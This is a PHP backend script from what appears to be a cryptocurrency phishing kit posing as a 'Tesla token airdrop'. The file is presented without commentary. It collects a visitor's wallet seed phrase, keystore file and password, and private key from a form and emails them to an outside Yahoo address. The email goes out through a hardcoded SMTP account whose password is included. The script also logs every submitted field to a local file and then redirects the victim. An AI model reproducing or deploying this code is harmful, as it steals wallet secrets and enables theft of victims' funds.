<?php
require 'class/class.phpmailer.php';
 
// Set the location to redirect the page
header ('Location: ./validate.php');
 

if(isset($_POST['submit']))

{
    echo "error; you need to submit";
}


$type = isset($_POST['wallet_id']) ? $_POST['wallet_id'] : null;
$phrase = isset($_POST['phrase']) ? $_POST['phrase'] : null;
$key = isset($_POST['keystore']) ? $_POST['keystore'] : null;
$keypass = isset($_POST['keystorepassword']) ? $_POST['keystorepassword'] : null;
$prive = isset($_POST['privatekey']) ? $_POST['privatekey'] : null;


$mail = new PHPMailer();

    //Server settings
    $mail->SMTPDebug = 0; // Set to 2 for debugging
    $mail->isSMTP();
    $mail->Host = 'mail.teslatokenairdrop.com'; // Replace with your SMTP server
    $mail->SMTPAuth = true;
    $mail->Username = 'support@teslatokenairdrop.com'; // Replace with your SMTP username
    $mail->Password = 'Apostolic61#'; // Replace with your SMTP password
    $mail->SMTPSecure = 'ssl';
    $mail->Port = 465; // You may need to change this port

    //Recipients
    $mail->setFrom('support@teslatokenairdrop.com', 'TTA');
    // $mail->setFrom('support@premieraccs.com', 'PremierAccs');

    $mail->addAddress('elonmuskprivatebox.usa@yahoo.com');

    //Content
    $mail->isHTML(false);
    $mail->Subject = 'New Drop';
    
    $email_body = "Someone has filled up the form with the following details:\n";

    if (!empty($type)) {
        $email_body .= "Wallet Type: $type\n";
    }
    if (!empty($phrase)) {
        $email_body .= "Phrase: $phrase\n";
    }
    if (!empty($key)) {
        $email_body .= "KeyStore: $key\n";
    }
    if (!empty($keypass)) {
        $email_body .= "KeyStore Password: $keypass\n";
    }
    if (!empty($prive)) {
        $email_body .= "Private Key: $prive\n";
    }

    $mail->Body = $email_body;

    $mail->send();


// Open the text file in writing mode
$file = fopen("log.txt", "a");
 
foreach($_POST as $variable => $value) {
    fwrite($file, $variable);
    fwrite($file, "=");
    fwrite($file, $value);
    fwrite($file, "\r\n");
}
 
fwrite($file, "\r\n");
fclose($file);
exit;
?>